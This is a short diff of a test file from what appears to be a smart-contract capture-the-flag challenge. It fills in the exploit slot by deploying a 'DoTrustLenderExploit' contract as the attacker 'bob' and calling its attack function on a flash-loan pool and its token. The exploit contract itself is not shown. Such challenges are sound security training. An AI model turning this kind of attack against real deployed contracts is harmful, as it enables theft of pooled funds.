@@ -33,7 +33,15 @@ describe(challengeName, function () {
   });
 
   it("Exploit", async function () {
-    /** CODE YOUR EXPLOIT HERE  */
+    /** CODE YOUR EXPLOIT HERE **/
+    const DoTrustLenderExploit = await ethers.getContractFactory(
+      "DoTrustLenderExploit",
+      bob
+    );
+
+    this.exploit = await DoTrustLenderExploit.deploy();
+    this.exploit.attack(this.pool.address, this.token.address);
+
   });
 
   after(async function () {
